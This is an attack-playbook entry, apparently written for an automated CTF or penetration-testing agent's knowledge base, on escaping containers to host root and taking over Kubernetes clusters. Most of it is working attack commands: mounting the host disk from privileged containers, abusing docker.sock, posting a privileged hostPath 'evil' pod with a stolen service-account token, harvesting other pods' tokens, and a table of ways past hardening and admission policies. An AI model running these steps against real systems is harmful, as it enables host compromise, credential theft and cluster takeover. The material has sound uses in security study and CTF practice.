# [Seed] Container escape → host root (cap_sys_admin / privileged container / docker.sock)

## Scenario category
Penetration testing / cloud-native / container security

## Goal summary
Obtain a shell inside a container through an application vulnerability, exposed Jenkins, or K8s RCE. Escape to the host and then move laterally through the K8s cluster.

## Full execution path

1. Reconnoiter immediately after entering the container.
   ```bash
   id                                    # Check whether this is root.
   cat /proc/self/status | grep CapEff   # Inspect capabilities.
   capsh --print                         # Print the same data in a clearer form.
   ls -la /var/run/docker.sock           # Check for a mounted Docker socket.
   mount | grep -v proc                  # List mounted host directories.
   cat /proc/1/cgroup                    # Identify docker / containerd / kubepods.
   env | grep -i 'kube\|docker\|aws\|az' # Check service-account and metadata tokens.
   ls /var/run/secrets/kubernetes.io/serviceaccount/  # List the K8s SA token.
   ```
2. Choose an escape path from the results:

   **Path A: privileged container (`--privileged`)**
   ```bash
   # Mount the host disk directly.
   mkdir /host && mount /dev/sda1 /host
   chroot /host
   # You are now host root.
   ```

   **Path B: cap_sys_admin / cap_dac_read_search**
   ```bash
   # Exploit release_agent bypass (CVE-2022-0492 class).
   # Use cap_sys_admin to mount directly.
   ```

   **Path C: mounted docker.sock**
   ```bash
   docker -H unix:///var/run/docker.sock run -v /:/host alpine chroot /host bash
   ```

   **Path D: over-privileged K8s SA token**
   ```bash
   TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
   kubectl --token=$TOKEN auth can-i --list
   # If it can create a pod → start a privileged pod with hostPID/hostNetwork/hostPath and escape.
   ```

   **Path E: kernel exploit (Dirty Pipe / Dirty COW / OverlayFS)**
   ```bash
   uname -a               # Check the kernel version.
   # Choose an available exploit for the matching CVE.
   ```

3. After escaping, find the next hop on the host.
   - Kubelet credentials (`/var/lib/kubelet`)
   - Container runtime socket (containerd / dockerd)
   - Tokens from other pods
   - `hostNetwork` → connect directly to every cluster service IP
4. Move laterally through the K8s cluster.

## Pitfall log

| Problem | Cause | Solution | Time |
|------|------|---------|------|
| The container was non-root and had no capabilities | The application layer was hardened | Find a setuid binary, kernel vulnerability, or vulnerability outside the container | Several hours |
| The Docker socket was visible but unreadable | The socket was `root:root` with mode 660 | Add the current UID to the docker group if a setgid program allows it, or use another container | 30min |
| A privileged pod started but the image download failed | The internal cluster used an internal Docker registry | Use an existing image from the cluster, such as one under kube-system | 20min |
| The K8s SA token had no permissions | The default SA is usually default/restricted | Try listing pods → find a pod with cluster-admin → steal its SA token | 1h |
| The chroot lacked common tools | The host used a minimal distribution | Mount /proc, /dev, and /sys before chroot, or operate directly in the original namespace through /host | 30min |
| The cluster enforced PodSecurity Standards | The restricted policy blocked hostPath and privileged pods | Check for a namespace with relaxed admission settings and find an SA that can create deployments | Several hours |

## Toolchain findings

- **deepce** automates container-escape checks with one dependency-free shell script.
- **kdigger** is a Kubernetes and container reconnaissance tool that produces structured output.
- **peirates** is a K8s penetration-testing TUI.
- **kube-hunter** from Aqua scans cluster security issues.
- **botb (break out the box)** is an older container-escape tool.
- **cdk** is a broad container penetration-testing utility that covers Chinese cloud-provider environments.

## Key code / commands

One-command self-check:

```bash
# Download deepce (no dependencies)
wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh
chmod +x deepce.sh
./deepce.sh
# Output: N escape paths detected
```

Use a K8s SA token to start a privileged pod and escape:

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc

# Check permissions
curl -sk --header "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -X POST -d '{"spec":{"namespace":"default"}}'

# If it can create pods, mount the host with hostPath.
cat <<EOF > evil-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: evil
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: evil
    image: alpine
    command: ["/bin/sh","-c","sleep 999999"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
EOF

curl -sk --header "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/yaml" \
  -X POST $APISERVER/api/v1/namespaces/default/pods \
  --data-binary @evil-pod.yaml

# Then exec into the evil pod and run chroot /host
```

CVE-2022-0492 exploitation (cap_sys_admin without a user namespace):

```bash
# See https://github.com/PaloAltoNetworks/cve-2022-0492
# Core path: mount cgroup → write release_agent → trigger an empty cgroup → execute in the host context
```

## Improvement suggestions for this package

- `CTF-Sandbox-Orchestrator/competition-agent-cloud/` already exists. Add `references/k8s-attack-paths.md`.
- Add a full "container escape → cluster takeover" path example to attack-chain.
- Add deepce / kdigger / peirates to the bootstrap manifest.

## Reusable patterns / script fragments

**Five container-escape paths**:

```text
1. Privileged container  → mount /dev/sda1 /host && chroot /host
2. cap_sys_admin        → CVE-2022-0492 (release_agent) / mount cgroup directly
3. docker.sock          → docker run -v /:/host alpine chroot /host
4. K8s SA + permissions  → start a hostPath/privileged pod
5. Kernel CVE           → DirtyPipe (CVE-2022-0847) / DirtyCred (CVE-2022-2588) / OverlayFS (CVE-2023-0386)
```

**Checks after escaping**:

```text
- /var/lib/kubelet/pods/        → steal SA tokens from other pods
- /var/lib/docker/              → list running containers
- ip addr                        → use hostNetwork to access service IPs directly
- crictl ps                      → list containerd containers
- ps -ef --forest                → find kubelet / dockerd startup arguments, including tokens
```


## Evolution actions
- [ ] Add k8s-attack-paths.md to CTF-Sandbox-Orchestrator/competition-agent-cloud
- [ ] Add the container-escape → cluster-takeover path to attack-chain
- [ ] Add deepce/kdigger/peirates to the bootstrap manifest

## Environment information
- Attack position: inside a container (any shell entry point)
- Target: K8s 1.24+ / Docker 20+ / containerd 1.6+
- Kernel: depends on the target; check the CVE-2022-0492 / CVE-2022-0847 / CVE-2023-0386 time window

## Redaction requirements
This seed entry is based on public container and K8s security research and does not involve a real cluster.
